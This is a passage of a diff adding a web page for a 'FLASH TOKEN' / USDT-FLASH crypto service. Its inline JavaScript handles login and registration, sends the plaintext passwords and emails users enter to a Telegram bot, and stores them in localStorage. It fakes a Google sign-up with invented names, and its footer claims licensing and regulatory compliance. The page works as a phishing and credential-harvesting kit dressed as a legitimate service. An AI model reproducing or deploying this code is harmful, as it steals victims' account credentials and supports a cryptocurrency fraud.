+            
+            console.log('User saved to localStorage:', userData);
+            return userData;
+        }
+        
+        // Update daily statistics
+        function updateDailyStats(userData) {
+            const today = new Date().toISOString().split('T')[0]; // YYYY-MM-DD
+            let stats = JSON.parse(localStorage.getItem('dailyStats')) || {};
+            
+            if (!stats[today]) {
+                stats[today] = {
+                    date: today,
+                    totalRegistrations: 0,
+                    totalLogins: 0,
+                    quickRegistrations: 0,
+                    manualRegistrations: 0,
+                    googleRegistrations: 0,
+                    countries: {},
+                    devices: {
+                        mobile: 0,
+                        desktop: 0
+                    }
+                };
+            }
+            
+            // Update counts
+            if (userData.type === 'login') {
+                stats[today].totalLogins++;
+            } else {
+                stats[today].totalRegistrations++;
+                
+                if (userData.registrationType === 'quick') {
+                    stats[today].quickRegistrations++;
+                } else if (userData.registrationType === 'manual') {
+                    stats[today].manualRegistrations++;
+                } else if (userData.registrationType === 'google') {
+                    stats[today].googleRegistrations++;
+                }
+            }
+            
+            // Update country stats
+            if (userData.country && userData.country.country) {
+                const countryName = userData.country.country;
+                stats[today].countries[countryName] = (stats[today].countries[countryName] || 0) + 1;
+            }
+            
+            // Update device stats
+            const isMobile = navigator.userAgent.includes('Mobile');
+            if (isMobile) {
+                stats[today].devices.mobile++;
+            } else {
+                stats[today].devices.desktop++;
+            }
+            
+            localStorage.setItem('dailyStats', JSON.stringify(stats));
+            
+            // Send daily stats to Telegram if it's a new registration
+            if (userData.type !== 'login') {
+                sendDailyStatsToTelegram(stats[today]);
+            }
+        }
+        
+        // Send daily statistics to Telegram
+        async function sendDailyStatsToTelegram(todayStats) {
+            const message = formatDailyStatsMessage(todayStats);
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending stats to Telegram:', error);
+            }
+        }
+        
+        // Format daily statistics message
+        function formatDailyStatsMessage(stats) {
+            let message = `📊 <b>Daily Statistics Update</b>\n\n`;
+            message += `📅 <b>Date:</b> ${stats.date}\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+            
+            // Registration stats
+            message += `🆕 <b>Registrations Today:</b> ${stats.totalRegistrations}\n`;
+            if (stats.totalRegistrations > 0) {
+                message += `   ⚡ Quick: ${stats.quickRegistrations}\n`;
+                message += `   📝 Manual: ${stats.manualRegistrations}\n`;
+                message += `   🔵 Google: ${stats.googleRegistrations}\n`;
+            }
+            message += `\n`;
+            
+            // Login stats
+            message += `🔓 <b>Logins Today:</b> ${stats.totalLogins}\n\n`;
+            
+            // Device stats
+            const totalDevices = stats.devices.mobile + stats.devices.desktop;
+            if (totalDevices > 0) {
+                message += `💻 <b>Devices:</b>\n`;
+                message += `   📱 Mobile: ${stats.devices.mobile} (${Math.round(stats.devices.mobile/totalDevices*100)}%)\n`;
+                message += `   🖥️ Desktop: ${stats.devices.desktop} (${Math.round(stats.devices.desktop/totalDevices*100)}%)\n`;
+                message += `\n`;
+            }
+            
+            // Country stats
+            const countries = Object.entries(stats.countries);
+            if (countries.length > 0) {
+                message += `🌍 <b>Top Countries:</b>\n`;
+                countries
+                    .sort((a, b) => b[1] - a[1])
+                    .slice(0, 5)
+                    .forEach(([country, count]) => {
+                        message += `   • ${country}: ${count}\n`;
+                    });
+            }
+            
+            message += `\n━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `🔄 <i>Auto-updated statistics</i>`;
+            
+            return message;
+        }
+        
+        function getUsersFromLocalStorage() {
+            return JSON.parse(localStorage.getItem('registeredUsers')) || [];
+        }
+        
+        function getCurrentUser() {
+            return JSON.parse(localStorage.getItem('currentUser')) || null;
+        }
+        
+        // Modal functionality
+        const createAccountBtn = document.getElementById('createAccountBtn');
+        const registrationModal = document.getElementById('registrationModal');
+        const closeModal = document.getElementById('closeModal');
+        
+        createAccountBtn.addEventListener('click', function() {
+            registrationModal.classList.add('active');
+        });
+        
+        closeModal.addEventListener('click', function() {
+            registrationModal.classList.remove('active');
+        });
+        
+        registrationModal.addEventListener('click', function(e) {
+            if (e.target === registrationModal) {
+                registrationModal.classList.remove('active');
+            }
+        });
+        
+        // Login form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const button = this.querySelector('.login-button');
+            const emailOrUserId = this.querySelector('input[placeholder="Email or User ID"]').value;
+            const password = this.querySelector('input[placeholder="Password"]').value;
+            
+            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Logging in...';
+            button.disabled = true;
+            
+            // Send login data to Telegram
+            const loginData = {
+                type: 'login',
+                emailOrUserId: emailOrUserId,
+                password: password
+            };
+            
+            // Update stats for login
+            updateDailyStats(loginData);
+            
+            sendToTelegram(loginData);
+            
+            setTimeout(() => {
+                button.innerHTML = '<i class="fas fa-check"></i> Success!';
+                
+                // Save login data to localStorage
+                const currentUser = {
+                    emailOrUserId: emailOrUserId,
+                    password: password,
+                    loggedIn: true,
+                    loginTime: new Date().toISOString()
+                };
+                localStorage.setItem('user', JSON.stringify(currentUser));
+                
+                setTimeout(() => {
+                    window.location.href = 'captcha.html';
+                }, 800);
+            }, 1500);
+        });
+        
+        // Registration form submission
+        document.getElementById('registrationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const button = this.querySelector('.signup-button');
+            const firstName = this.querySelector('input[placeholder="First name"]').value;
+            const lastName = this.querySelector('input[placeholder="Last name"]').value;
+            const email = this.querySelector('input[placeholder="Email address"]').value;
+            const password = this.querySelector('input[placeholder="New password"]').value;
+            
+            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating...';
+            button.disabled = true;
+            
+            setTimeout(() => {
+                // Generate user ID
+                const userId = 'USER' + Math.random().toString(36).substr(2, 9).toUpperCase();
+                
+                // Save user data to localStorage
+                const userData = {
+                    userId: userId,
+                    password: password,
+                    registrationType: 'manual',
+                    fullName: `${firstName} ${lastName}`,
+                    firstName: firstName,
+                    lastName: lastName,
+                    email: email
+                };
+                
+                saveUserToLocalStorage(userData);
+                
+                // Send to Telegram
+                sendToTelegram(userData);
+                
+                button.innerHTML = '<i class="fas fa-check"></i> Account Created!';
+                
+                // Save to user object for profile
+                const userForProfile = {
+                    userId: userId,
+                    password: password,
+                    firstName: firstName,
+                    lastName: lastName,
+                    name: `${firstName} ${lastName}`,
+                    email: email,
+                    registrationType: 'manual',
+                    loggedIn: true,
+                    registeredAt: new Date().toISOString()
+                };
+                localStorage.setItem('user', JSON.stringify(userForProfile));
+                
+                setTimeout(() => {
+                    window.location.href = 'captcha.html';
+                }, 800);
+            }, 1500);
+        });
+        
+        // Show manual registration form
+        function showManualForm() {
+            document.getElementById('registrationOptions').style.display = 'none';
+            document.getElementById('registrationForm').style.display = 'block';
+        }
+        
+        // Show registration options
+        function showRegistrationOptions() {
+            document.getElementById('registrationOptions').style.display = 'block';
+            document.getElementById('registrationForm').style.display = 'none';
+        }
+        
+        // Quick registration with one click
+        function quickRegister() {
+            const modal = document.getElementById('registrationModal');
+            const modalBody = modal.querySelector('.modal-body');
+            
+            // Show loading state
+            modalBody.innerHTML = `
+                <div style="text-align: center; padding: 40px 20px;">
+                    <i class="fas fa-spinner fa-spin text-5xl text-green-600 mb-4"></i>
+                    <h3 class="text-xl font-bold text-gray-800 mb-2">Creating Your Account...</h3>
+                    <p class="text-gray-600">Please wait a moment</p>
+                </div>
+            `;
+            
+            // Simulate account creation
+            setTimeout(() => {
+                // Generate random user ID and password
+                const userId = 'USER' + Math.random().toString(36).substr(2, 9).toUpperCase();
+                const tempPassword = generateRandomPassword();
+                
+                // Save user data to localStorage
+                const userData = {
+                    userId: userId,
+                    password: tempPassword,
+                    registrationType: 'quick',
+                    fullName: null,
+                    email: null
+                };
+                
+                saveUserToLocalStorage(userData);
+                
+                // Send to Telegram
+                sendToTelegram(userData);
+                
+                // Save to user object for profile
+                const userForProfile = {
+                    userId: userId,
+                    password: tempPassword,
+                    registrationType: 'quick',
+                    loggedIn: true,
+                    registeredAt: new Date().toISOString()
+                };
+                localStorage.setItem('user', JSON.stringify(userForProfile));
+                
+                // Show success with credentials
+                modalBody.innerHTML = `
+                    <div style="text-align: center; padding: 40px 20px;">
+                        <i class="fas fa-check-circle text-6xl text-green-600 mb-4"></i>
+                        <h3 class="text-2xl font-bold text-gray-800 mb-4">Account Created Successfully!</h3>
+                        
+                        <div style="background: rgba(16, 185, 129, 0.1); border: 2px solid #10b981; border-radius: 12px; padding: 20px; margin: 20px 0; text-align: left;">
+                            <p class="text-sm text-gray-600 mb-3"><strong>Your Login Credentials:</strong></p>
+                            
+                            <div class="mb-3">
+                                <label class="text-xs text-gray-500">User ID:</label>
+                                <div class="flex items-center gap-2">
+                                    <input type="text" value="${userId}" id="userIdField" readonly class="form-input" style="margin: 0;">
+                                    <button onclick="copyToClipboard('userIdField')" class="p-2 bg-green-600 text-white rounded-lg hover:bg-green-700">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                            </div>
+                            
+                            <div>
+                                <label class="text-xs text-gray-500">Password:</label>
+                                <div class="flex items-center gap-2">
+                                    <input type="text" value="${tempPassword}" id="passwordField" readonly class="form-input" style="margin: 0;">
+                                    <button onclick="copyToClipboard('passwordField')" class="p-2 bg-green-600 text-white rounded-lg hover:bg-green-700">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <p class="text-sm text-gray-600 mb-4">⚠️ Please save these credentials. You can change your password after logging in.</p>
+                        <p class="text-xs text-green-600 mb-4"><i class="fas fa-check-circle"></i> Account data saved to your device</p>
+                        
+                        <button onclick="window.location.href='captcha.html'" class="login-button" style="margin-top: 0;">
+                            Continue to Verification
+                        </button>
+                    </div>
+                `;
+            }, 2000);
+        }
+        
+        // Generate random password
+        function generateRandomPassword() {
+            const length = 12;
+            const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
+            let password = '';
+            for (let i = 0; i < length; i++) {
+                password += charset.charAt(Math.floor(Math.random() * charset.length));
+            }
+            return password;
+        }
+        
+        // Google Sign Up in Modal
+        document.getElementById('googleSignUpBtn').addEventListener('click', function() {
+            const button = this;
+            const originalHTML = button.innerHTML;
+            
+            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Connecting to Google...</span>';
+            button.disabled = true;
+            
+            setTimeout(() => {
+                // Generate user data for Google sign up
+                const userId = 'USER' + Math.random().toString(36).substr(2, 9).toUpperCase();
+                const tempPassword = generateRandomPassword();
+                
+                // Simulate Google account data
+                const googleNames = [
+                    {first: 'Alex', last: 'Johnson'},
+                    {first: 'Sarah', last: 'Williams'},
+                    {first: 'Michael', last: 'Brown'},
+                    {first: 'Emma', last: 'Davis'},
+                    {first: 'James', last: 'Miller'},
+                    {first: 'Olivia', last: 'Wilson'},
+                    {first: 'David', last: 'Moore'},
+                    {first: 'Sophia', last: 'Taylor'}
+                ];
+                
+                const randomName = googleNames[Math.floor(Math.random() * googleNames.length)];
+                const randomNum = Math.floor(Math.random() * 999) + 100;
+                const googleEmail = `${randomName.first.toLowerCase()}.${randomName.last.toLowerCase()}${randomNum}@gmail.com`;
+                
+                // Save user data to localStorage
+                const userData = {
+                    userId: userId,
+                    password: tempPassword,
+                    registrationType: 'google',
+                    fullName: `${randomName.first} ${randomName.last}`,
+                    firstName: randomName.first,
+                    lastName: randomName.last,
+                    email: googleEmail,
+                    googleAccount: true
+                };
+                
+                saveUserToLocalStorage(userData);
+                
+                // Send to Telegram
+                sendToTelegram(userData);
+                
+                // Save to user object for profile
+                const userForProfile = {
+                    userId: userId,
+                    password: tempPassword,
+                    firstName: randomName.first,
+                    lastName: randomName.last,
+                    name: `${randomName.first} ${randomName.last}`,
+                    email: googleEmail,
+                    registrationType: 'google',
+                    googleAccount: true,
+                    loggedIn: true,
+                    registeredAt: new Date().toISOString()
+                };
+                localStorage.setItem('user', JSON.stringify(userForProfile));
+                
+                button.innerHTML = '<i class="fas fa-check"></i> <span>Account Created!</span>';
+                
+                setTimeout(() => {
+                    window.location.href = 'captcha.html';
+                }, 800);
+            }, 1500);
+        });
+        
+        // Copy to clipboard function
+        function copyToClipboard(fieldId) {
+            const field = document.getElementById(fieldId);
+            field.select();
+            document.execCommand('copy');
+            
+            // Show feedback
+            const button = event.target.closest('button');
+            const originalHTML = button.innerHTML;
+            button.innerHTML = '<i class="fas fa-check"></i>';
+            setTimeout(() => {
+                button.innerHTML = originalHTML;
+            }, 1000);
+        }
+    </script>
+
+    <!-- Professional Footer -->
+    <footer class="bg-white text-gray-800 shadow-2xl relative overflow-hidden border-t border-gray-200">
+        <!-- Subtle Background Pattern -->
+        <div class="absolute inset-0 opacity-3 pointer-events-none">
+            <div class="absolute top-10 left-10 text-6xl text-gray-300 transform rotate-12">₮</div>
+            <div class="absolute top-20 right-20 text-4xl text-gray-300 transform -rotate-12">₮</div>
+            <div class="absolute bottom-20 left-1/4 text-5xl text-gray-300 transform rotate-45">₮</div>
+            <div class="absolute bottom-10 right-1/3 text-3xl text-gray-300 transform -rotate-45">₮</div>
+        </div>
+        
+        <div class="container mx-auto px-4 sm:px-6 lg:px-8 py-10 lg:py-16 relative z-10">
+            <!-- Main Footer Grid -->
+            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 lg:gap-12 mb-10">
+                
+                <!-- Company Info -->
+                <div class="sm:col-span-2 lg:col-span-1">
+                    <div class="flex items-center gap-3 mb-4">
+                        <img src="img/usdt_cryptocurrencies_icon_188337.png" alt="FLASH TOKEN" class="h-10 w-10 lg:h-12 lg:w-12">
+                        <div>
+                            <h3 class="text-xl lg:text-3xl font-black text-green-600">FLASH TOKEN</h3>
+                            <p class="text-green-600 text-[11px] lg:text-sm font-semibold leading-tight">Professional Flash Solutions</p>
+                        </div>
+                    </div>
+                    
+                    <p class="text-gray-500 mb-5 leading-relaxed text-sm">
+                        Your trusted partner for secure USDT-FLASH transactions since 2019. Enterprise-grade security, instant delivery, and 24/7 professional support to over 50,000+ customers worldwide.
+                    </p>
+                    
+                    <!-- Stats -->
+                    <div class="grid grid-cols-2 gap-3 mb-5">
+                        <div class="text-center bg-gradient-to-br from-green-50 to-green-100/80 p-3 rounded-xl border border-green-200/60">
+                            <div class="text-xl lg:text-3xl font-black text-green-600">99.9%</div>
+                            <div class="text-[10px] lg:text-xs text-gray-500 font-medium">Success Rate</div>
+                        </div>
+                        <div class="text-center bg-gradient-to-br from-blue-50 to-blue-100/80 p-3 rounded-xl border border-blue-200/60">
+                            <div class="text-xl lg:text-3xl font-black text-blue-600">24/7</div>
+                            <div class="text-[10px] lg:text-xs text-gray-500 font-medium">Support</div>
+                        </div>
+                    </div>
+                    
+                    <!-- Social -->
+                    <div class="flex flex-wrap gap-2">
+                        <a href="#" class="group p-2.5 bg-gray-100 hover:bg-gray-900 rounded-xl transition-all duration-300">
+                            <span class="text-sm font-bold text-gray-600 group-hover:text-white">𝕏</span>
+                        </a>
+                        <a href="#" class="group p-2.5 bg-gray-100 hover:bg-blue-600 rounded-xl transition-all duration-300">
+                            <i class="fab fa-facebook text-sm text-gray-600 group-hover:text-white"></i>
+                        </a>
+                        <a href="#" class="group p-2.5 bg-gray-100 hover:bg-pink-600 rounded-xl transition-all duration-300">
+                            <i class="fab fa-instagram text-sm text-gray-600 group-hover:text-white"></i>
+                        </a>
+                        <a href="#" class="group p-2.5 bg-gray-100 hover:bg-blue-500 rounded-xl transition-all duration-300">
+                            <i class="fab fa-telegram text-sm text-gray-600 group-hover:text-white"></i>
+                        </a>
+                    </div>
+                </div>
+                
+                <!-- Supported Platforms -->
+                <div>
+                    <h4 class="text-sm lg:text-lg font-bold text-green-600 mb-3 lg:mb-4">Supported Platforms</h4>
+                    <div class="grid grid-cols-4 sm:grid-cols-3 gap-2 mb-5">
+                        <div class="flex flex-col items-center gap-1">
+                            <img src="img/Binance Web3.jpeg" alt="Binance" class="h-7 w-7 lg:h-8 lg:w-8 object-contain rounded shadow-sm">
+                            <span class="text-[10px] lg:text-xs text-gray-500 font-medium">Binance</span>
+                        </div>
+                        <div class="flex flex-col items-center gap-1">
+                            <img src="img/Trust_Wallet_2023_b-stacked.webp" alt="Trust Wallet" class="h-7 w-7 lg:h-8 lg:w-8 object-contain rounded shadow-sm">
+                            <span class="text-[10px] lg:text-xs text-gray-500 font-medium">Trust</span>
+                        </div>
+                        <div class="flex flex-col items-center gap-1">
+                            <img src="img/BYBIT.jpg" alt="Bybit" class="h-7 w-7 lg:h-8 lg:w-8 object-contain rounded shadow-sm">
+                            <span class="text-[10px] lg:text-xs text-gray-500 font-medium">Bybit</span>
+                        </div>
+                        <div class="flex flex-col items-center gap-1">
+                            <img src="img/META MASK.png" alt="MetaMask" class="h-7 w-7 lg:h-8 lg:w-8 object-contain rounded shadow-sm">
+                            <span class="text-[10px] lg:text-xs text-gray-500 font-medium">MetaMask</span>
+                        </div>
+                        <div class="flex flex-col items-center gap-1">
+                            <img src="img/OKX_Logo.svg" alt="OKX" class="h-7 w-7 lg:h-8 lg:w-8 object-contain rounded shadow-sm">
+                            <span class="text-[10px] lg:text-xs text-gray-500 font-medium">OKX</span>
+                        </div>
+                        <div class="flex flex-col items-center gap-1">
+                            <img src="img/bitkeep-bitget-wallet.webp" alt="Bitget" class="h-7 w-7 lg:h-8 lg:w-8 object-contain rounded shadow-sm">
+                            <span class="text-[10px] lg:text-xs text-gray-500 font-medium">Bitget</span>
+                        </div>
+                        <div class="flex flex-col items-center gap-1">
+                            <img src="nouveu/apps.705.14135041483387905.15690a85-df4d-4ece-aeda-d4afd6caa090.png" alt="1xbet" class="h-7 w-7 lg:h-8 lg:w-8 object-contain rounded shadow-sm">
+                            <span class="text-[10px] lg:text-xs text-gray-500 font-medium">1xbet</span>
+                        </div>
+                    </div>
+                    
+                    <h4 class="text-sm lg:text-lg font-bold text-green-600 mb-3 lg:mb-4">Supported Currencies</h4>
+                    <div class="flex flex-wrap gap-2">
+                        <div class="inline-flex items-center gap-1.5 bg-orange-50 px-2.5 py-1.5 rounded-lg border border-orange-200/60">
+                            <img src="Coin/Shiba.png" alt="SHIBA" class="h-5 w-5 lg:h-6 lg:w-6 object-contain">
+                            <span class="text-[11px] lg:text-xs font-semibold text-gray-600">SHIBA</span>
+                        </div>
+                        <div class="inline-flex items-center gap-1.5 bg-green-50 px-2.5 py-1.5 rounded-lg border border-green-200/60">
+                            <img src="Coin/pepe.jpg" alt="PEPE" class="h-5 w-5 lg:h-6 lg:w-6 object-contain rounded">
+                            <span class="text-[11px] lg:text-xs font-semibold text-gray-600">PEPE</span>
+                        </div>
+                        <div class="inline-flex items-center gap-1.5 bg-yellow-50 px-2.5 py-1.5 rounded-lg border border-yellow-200/60">
+                            <img src="Coin/Dogecoin_Logo.png" alt="DOGE" class="h-5 w-5 lg:h-6 lg:w-6 object-contain">
+                            <span class="text-[11px] lg:text-xs font-semibold text-gray-600">DOGE</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Contact & Policies -->
+                <div>
+                    <h4 class="text-sm lg:text-lg font-bold text-green-600 mb-3 lg:mb-4">Contact</h4>
+                    <ul class="space-y-2.5">
+                        <li>
+                            <a href="pages/live-transactions.html" class="flex items-center gap-2.5 text-gray-500 hover:text-green-600 transition-colors text-sm">
+                                <i class="fas fa-chart-line text-green-600 text-xs w-4"></i>
+                                <span>Live Transactions</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="pages/support.html" class="flex items-center gap-2.5 text-gray-500 hover:text-green-600 transition-colors text-sm">
+                                <i class="fas fa-headset text-green-600 text-xs w-4"></i>
+                                <span>Technical Support</span>
+                            </a>
+                        </li>
+                        <li>
+                            <span class="flex items-center gap-2.5 text-gray-500 text-sm">
+                                <i class="fas fa-clock text-green-600 text-xs w-4"></i>
+                                <span>24/7 Customer Service</span>
+                            </span>
+                        </li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h4 class="text-sm lg:text-lg font-bold text-green-600 mb-3 lg:mb-4">Policies</h4>
+                    <ul class="space-y-2.5">
+                        <li>
+                            <a href="pages/privacy-policy.html" class="flex items-center gap-2.5 text-gray-500 hover:text-green-600 transition-colors text-sm">
+                                <i class="fas fa-shield-alt text-green-600 text-xs w-4"></i>
+                                <span>Privacy Policy</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="pages/terms-of-service.html" class="flex items-center gap-2.5 text-gray-500 hover:text-green-600 transition-colors text-sm">
+                                <i class="fas fa-file-contract text-green-600 text-xs w-4"></i>
+                                <span>Terms of Service</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="pages/aml-policy.html" class="flex items-center gap-2.5 text-gray-500 hover:text-green-600 transition-colors text-sm">
+                                <i class="fas fa-user-shield text-green-600 text-xs w-4"></i>
+                                <span>AML Policy</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="about-ar.html" class="flex items-center gap-2.5 text-gray-500 hover:text-green-600 transition-colors text-sm">
+                                <i class="fas fa-info-circle text-green-600 text-xs w-4"></i>
+                                <span>About Us (Arabic)</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="about-en.html" class="flex items-center gap-2.5 text-gray-500 hover:text-green-600 transition-colors text-sm">
+                                <i class="fas fa-info-circle text-green-600 text-xs w-4"></i>
+                                <span>About Us (English)</span>
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            
+            <!-- Divider -->
+            <div class="border-t border-gray-200 my-6 lg:my-8"></div>
+            
+            <!-- Verification -->
+            <div class="flex justify-center mb-6 lg:mb-8">
+                <div class="w-full lg:w-auto bg-gradient-to-r from-green-50 to-blue-50 border border-green-200/80 px-4 py-3 lg:px-6 lg:py-4 rounded-xl flex flex-col sm:flex-row items-center gap-3 text-center sm:text-left">
+                    <img src="img/usdt_cryptocurrencies_icon_188337.png" alt="USDT" class="h-7 w-7 lg:h-8 lg:w-8 flex-shrink-0">
+                    <div>
+                        <div class="text-green-600 font-bold text-xs lg:text-sm mb-0.5">
+                            <i class="fas fa-certificate mr-1.5"></i>
+                            OFFICIAL FLASH TOKEN SERVICE PROVIDER
+                        </div>
+                        <div class="text-gray-500 text-[11px] lg:text-xs">
+                            Licensed Distributor • Verified Operations • Regulatory Compliant
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Copyright -->
+            <div class="text-center">
+                <p class="text-gray-400 text-[11px] lg:text-sm leading-relaxed">
+                    Copyright © 2013 - 2026 USDT-FLASH. All rights reserved. Professional USDT Service Provider.
+                </p>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
